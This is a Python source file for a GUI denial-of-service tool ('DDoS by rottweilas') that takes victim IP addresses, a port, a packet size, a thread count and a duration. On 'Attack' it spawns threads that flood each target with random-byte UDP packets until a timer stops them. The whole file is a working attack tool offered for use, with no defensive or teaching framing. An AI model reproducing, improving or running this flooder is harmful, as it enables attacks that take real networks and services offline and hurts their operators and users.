import os
import threading
from threading import Timer
import socket
import random
import re
from subprocess import Popen
import PySimpleGUI as sg

darkDDoS_themedict = {'BACKGROUND': '#000',
    'TEXT': '#FF3333',
    'INPUT': '#000',
    'TEXT_INPUT': '#FF3333',
    'SCROLL': '#FF3333',
    'BUTTON': ('#FF3333', '#000'),
    'PROGRESS': ('#FF3333', '#000'),
    'BORDER': 1,
    'SLIDER_DEPTH': 1,
    'PROGRESS_DEPTH': 0}

sg.theme_add_new('darkDDoS', darkDDoS_themedict)
sg.theme('darkDDoS')
ips = []

layout =    [[sg.Text('Contact: rottweilasdev@gmail.com')],
            [sg.Text('IP: ', size=(9, 1)), sg.Input(key='-newIP-', tooltip = 'Victim IP.', size=(39,1)), sg.Button('Add', tooltip = 'Add new IP.')],
            [sg.Text('IP list: ', size=(10, 1)), sg.Listbox(key='-ipList-', values='', tooltip = 'List of IPs.', enable_events=True, size=(44,6))],
            [sg.Text('Port: ', size=(9, 1)), sg.Input(key='-port-', tooltip = 'Victim port.')],
            [sg.Text('Packet size: ', size=(9, 1)), sg.Input(key='-pckt-', tooltip = 'Expressed in bytes.')],
            [sg.Text('Threads: ', size=(9, 1)), sg.Input(key='-threads-', tooltip = 'Threads to use.')],
            [sg.Text('Time: ', size=(9, 1)), sg.Input(key='-seconds-', tooltip = 'Expressed in seconds.')],
            #[sg.ProgressBar(900, orientation='h', size=(40,20), key='-progress-')],
            [sg.Text('INFO: ', size=(9, 1)), sg.Input(disabled = True, disabled_readonly_background_color = '#000', disabled_readonly_text_color = '#FF3333', key='-txtOutput-')],
            [sg.Button('Remove', tooltip = 'Remove selected IP.'), sg.Button('Attack', tooltip = 'Start attack.'), sg.Button('Stop', tooltip = 'Stop attack.'), sg.Button('Exit', tooltip = 'Close.'), sg.Button('Support', tooltip = 'Get help.')]]
          
window = sg.Window('DDoS by rottweilas', layout, use_custom_titlebar=False, element_justification='c')
sg.Print('Output: ', do_not_reroute_stdout=False, size=(30,20), relative_location = (400, 0))
ipIndex = 0
counter = 0
cntr = 0
timeout = False
regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"

class funcs:
    
    def addIP(toCheckIp):
        if(re.search(regex, toCheckIp)): 
            ips.append(toCheckIp)
            window['-ipList-'].update(ips)
            window['-txtOutput-'].update('IP added.')
        else:
            window['-txtOutput-'].update('Insert a valid IP...')
    
    def checkArgs(port, pcktSize, threads, seconds):
        if(port.isnumeric()):
            if(pcktSize.isnumeric()):
                if(threads.isnumeric()):
                    if(seconds.isnumeric()):
                        return funcs.charge(port, pcktSize, threads, seconds)
                    else:
                        window['-txtOutput-'].update('Insert a valid time in seconds.')
                else:
                    window['-txtOutput-'].update('Insert a valid number of threads.')
            else:
                window['-txtOutput-'].update('Insert a valid packet size.')
        else:
            window['-txtOutput-'].update('Insert a valid port.')
    
    def removeIP():
        selected_index = window['-ipList-'].get_indexes()
        for c in str(selected_index): 
            if c.isnumeric(): 
                index = int(c)
                ips.pop(index)
                window['-ipList-'].update(ips)
                window['-txtOutput-'].update('IP removed.') 

    def timing():
        global timeout
        timeout = True
        global ipIndex
        global counter
        global cntr
        ipIndex = 0
        counter = 0
        cntr = 0
        funcs.initTimer(False, 0)

    def initTimer(type, seconds):
        global t
        if type == True:
            t = Timeout(seconds, funcs.timing)
            t.start()
        else:
            t.cancel()

    def charge(port, pcktSize, threads, seconds):
        port = format(layout[3][1].get())
        pcktSize = format(layout[4][1].get())
        threads = int(layout[5][1].get())
        seconds = int(layout[6][1].get())
        funcs.initTimer(True, seconds)
        listLength = len(ips)
        global ipIndex
        global counter
        global timeout
        timeout = False
        for length in range(listLength):
            for host in range(threads):
                attack = DDoS(ips[ipIndex], int(port), int(pcktSize))
                attack.start()
                counter += 1
                if counter == threads:
                    ipIndex += 1
    
    def support():
        os.popen("start chrome https://github.com/rottweilas")
        
class DDoS(threading.Thread):

    def __init__(self, ip, port, size):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.size = size

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(self.size)
            global cntr
            while timeout == False:
                s.sendto(bytes,(self.ip, self.port))
                print(f'\nPacket sent to: {self.ip}', end='')
                cntr = cntr + 1
                window['-txtOutput-'].update('packets sent: {}'.format(cntr))
        except KeyboardInterrupt:
            print('Exit...')
    
class Timeout():

    def __init__(self, seconds, target):
        self._should_continue = False
        self.is_running = False
        self.seconds = seconds
        self.target = target
        self.thread = None

    def _handle_target(self):
        self.is_running = True
        self.target()
        self.is_running = False
        self._start_timer()

    def _start_timer(self):
        if self._should_continue: # Code could have been running when cancel was called.
            self.thread = Timer(self.seconds, self._handle_target)
            self.thread.start()

    def start(self):
        if not self._should_continue and not self.is_running:
            self._should_continue = True
            self._start_timer()

    def cancel(self):
        if self.thread is not None:
            self._should_continue = False # Just in case thread is running and cancel fails.
            self.thread.cancel()

while True:
    event, values = window.read()
    if event == sg.WIN_CLOSED or event == 'Exit': 
        break
    elif event == 'Add':
        funcs.addIP(layout[1][1].get())
    elif event == 'Remove':
        funcs.removeIP()
    elif event == 'Attack':
        funcs.checkArgs(layout[3][1].get(), layout[4][1].get(), layout[5][1].get(), layout[6][1].get())   
    elif event == 'Stop':
        funcs.timing()
    elif event == 'Support':
        funcs.support()

window.close()